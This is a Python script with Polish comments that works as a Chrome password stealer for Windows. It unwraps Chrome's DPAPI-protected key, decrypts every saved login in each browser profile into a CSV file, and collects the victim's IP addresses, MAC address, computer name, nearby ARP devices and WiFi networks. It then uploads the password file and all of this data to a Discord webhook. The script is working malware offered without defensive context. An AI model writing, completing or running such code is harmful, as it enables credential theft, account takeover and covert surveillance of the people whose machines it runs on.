

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv
import requests
import platform
import uuid
import tempfile
import socket
import subprocess
import re

# Funkcja do pobierania sekretnego klucza z przeglądarki Chrome
def get_secret_key():
    try:
        with open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'), 'r', encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]  # Usuń prefix DPAPI
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
    except Exception as e:
        print(f"[ERR] {str(e)}")
        print("[ERR] Nie można znaleźć klucza sekretnego Chrome")
        return None

# Funkcja do odszyfrowywania hasła
def decrypt_password(ciphertext, secret_key):
    try:
        init_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:]
        cipher = AES.new(secret_key, AES.MODE_GCM, init_vector)
        decrypted_password = cipher.decrypt(encrypted_password)
        return decrypted_password.rstrip(b'\x00').decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"[ERR] {str(e)}")
        print("[ERR] Nie można odszyfrować hasła")
        return ""

# Funkcja do uzyskiwania połączenia z bazą danych haseł Chrome
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] {str(e)}")
        print("[ERR] Nie można znaleźć bazy danych Chrome")
        return None

# Funkcja do uzyskiwania zewnętrznego adresu IPv4
def get_external_ipv4_address():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        if response.status_code == 200:
            external_ip = response.json()['ip']
            print(f"Zewnętrzny adres IPv4: {external_ip}")
            return external_ip
        else:
            print(f"Błąd podczas pobierania zewnętrznego adresu IPv4. Kod statusu: {response.status_code}")
            return None
    except Exception as e:
        print(f"Błąd podczas pobierania zewnętrznego adresu IPv4: {str(e)}")
        return None

# Funkcja do uzyskiwania adresu IPv6
def get_ipv6_address():
    try:
        ipv6_address = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
        print(f"Adres IPv6: {ipv6_address}")
        return ipv6_address
    except Exception as e:
        print(f"Błąd podczas pobierania adresu IPv6: {str(e)}")
        return None

# Funkcja do uzyskiwania adresu MAC
def get_mac_address():
    try:
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
        print(f"Adres MAC: {mac_address}")
        return mac_address
    except Exception as e:
        print(f"Błąd podczas pobierania adresu MAC: {str(e)}")
        return None

# Funkcja do uzyskiwania nazwy komputera
def get_computer_name():
    try:
        computer_name = platform.node()
        print(f"Nazwa komputera: {computer_name}")
        return computer_name
    except Exception as e:
        print(f"Błąd podczas pobierania nazwy komputera: {str(e)}")
        return None

# Funkcja do uzyskiwania informacji o połączonych urządzeniach
def get_connected_devices():
    try:
        result = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        devices = []
        lines = output.split('\n')
        for line in lines:
            if re.match(r'\d+\.\d+\.\d+\.\d+', line):
                parts = re.split(r'\s+', line)
                if len(parts) >= 3:
                    ip_address = parts[0]
                    mac_address = parts[1]
                    devices.append({"IP Address": ip_address, "MAC Address": mac_address})
        return devices
    except Exception as e:
        print(f"Błąd podczas pobierania informacji o urządzeniach: {str(e)}")
        return []

# Funkcja do uzyskiwania informacji o dostępnych sieciach WiFi
def get_wifi_networks():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'network'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        networks = []
        lines = output.split('\n')
        network_info = {}
        for line in lines:
            if re.match(r'\s+SSID \d+ :', line):
                if network_info:
                    networks.append(network_info)
                network_info = {}
            elif network_info and re.match(r'\s+\S+ \S+', line):
                parts = re.split(r':', line)
                if len(parts) == 2:
                    key = parts[0].strip()
                    value = parts[1].strip()
                    network_info[key] = value
        if network_info:
            networks.append(network_info)
        return networks
    except Exception as e:
        print(f"Błąd podczas pobierania informacji o sieciach WiFi: {str(e)}")
        return []

if __name__ == '__main__':
    try:
        # Utwórz tymczasowy katalog do przechowywania plików
        temp_dir = tempfile.mkdtemp()

        # Utwórz plik CSV do przechowywania odszyfrowanych haseł
        csv_file_path = os.path.join(temp_dir, 'odszyfrowane_hasla.csv')
        with open(csv_file_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',', escapechar='\\')
            csv_writer.writerow(["Indeks", "URL", "Nazwa użytkownika", "Hasło + kilka losowych znaków"])

            # Pobierz sekretny klucz z Chrome
            secret_key = get_secret_key()

            # Szukaj profilu użytkownika lub folderu domyślnego (tu jest przechowywane zaszyfrowane hasło do logowania)
            chrome_folders = [element for element in os.listdir(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')) if re.search("^Profile*|^Default$", element) is not None]
            for folder in chrome_folders:
                # Pobierz ścieżkę do bazy danych logowania Chrome
                chrome_path_login_db = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', folder, 'Login Data')
                conn = get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url and username and ciphertext:
                            # Odszyfruj hasło
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print(f"Sekwencja: {index}")
                            print(f"URL: {url}\nNazwa użytkownika: {username}\nHasło + kilka losowych znakow: {decrypted_password}\n")
                            print("*" * 50)
                            # Zapisz odszyfrowane hasło do pliku CSV
                            csv_writer.writerow([index, url.encode('utf-8'), username.encode('utf-8'), decrypted_password.encode('utf-8')])
                    # Zamknij połączenie z bazą danych
                    cursor.close()
                    conn.close()
                    # Usuń tymczasową bazę danych logowania
                    os.remove("Loginvault.db")

        print("Plik CSV został utworzony.")

        # Pobierz dane z Discord webhooka
        external_ipv4_address = get_external_ipv4_address()
        ipv6_address = get_ipv6_address()
        mac_address = get_mac_address()
        computer_name = get_computer_name()
        if external_ipv4_address and ipv6_address and mac_address and computer_name:
            data = {
                "content": f"Zewnętrzny adres IPv4: {external_ipv4_address}\n"
                           f"Adres IPv6: {ipv6_address}\n"
                           f"Adres MAC: {mac_address}\n"
                           f"Nazwa komputera: {computer_name}"
            }

            # Wyślij dane na Discord webhook
            webhook_url = 'WEBHOOK_URL'
            response = requests.post(webhook_url, json=data)

            if response.status_code == 204:
                print("Dane zostały wysłane na Discord webhook.")
            else:
                print(f"Błąd podczas wysyłania danych na Discord webhook. Kod statusu: {response.status_code}")

            # Wyślij plik CSV jako załącznik
            files = {'file': open(csv_file_path, 'rb')}
            response = requests.post(webhook_url, files=files)

            if response.status_code == 204:
                print("Plik CSV został wysłany na Discord webhook.")
            else:
                print(f"Błąd podczas wysyłania pliku CSV na Discord webhook. Kod statusu: {response.status_code}")
        else:
            print("Nie udało się pobrać wszystkich danych.")

        # Pobierz informacje o połączonych urządzeniach
        connected_devices = get_connected_devices()
        if connected_devices:
            data = {
                "content": "Podłączone urządzenia:\n" + json.dumps(connected_devices, indent=4)
            }

            # Wyślij dane na Discord webhook
            response = requests.post(webhook_url, json=data)

            if response.status_code == 204:
                print("Informacje o urządzeniach zostały wysłane na Discord webhook.")
            else:
                print(f"Błąd podczas wysyłania informacji o urządzeniach na Discord webhook. Kod statusu: {response.status_code}")
        else:
            print("Brak informacji o połączonych urządzeniach.")

        # Pobierz informacje o dostępnych sieciach WiFi
        wifi_networks = get_wifi_networks()
        if wifi_networks:
            data = {
                "content": "Dostępne sieci WiFi:\n" + json.dumps(wifi_networks, indent=4)
            }

            # Wyślij dane na Discord webhook
            response = requests.post(webhook_url, json=data)

            if response.status_code == 204:
                print("Informacje o sieciach WiFi zostały wysłane na Discord webhook.")
            else:
                print(f"Błąd podczas wysyłania informacji o sieciach WiFi na Discord webhook. Kod statusu: {response.status_code}")
        else:
            print("Brak informacji o dostępnych sieciach WiFi.")
    except Exception as e:
        print(f"[ERR] {str(e)}")
    finally:
        # Wyczyść tymczasowy katalog
        shutil.rmtree(temp_dir, ignore_errors=True)
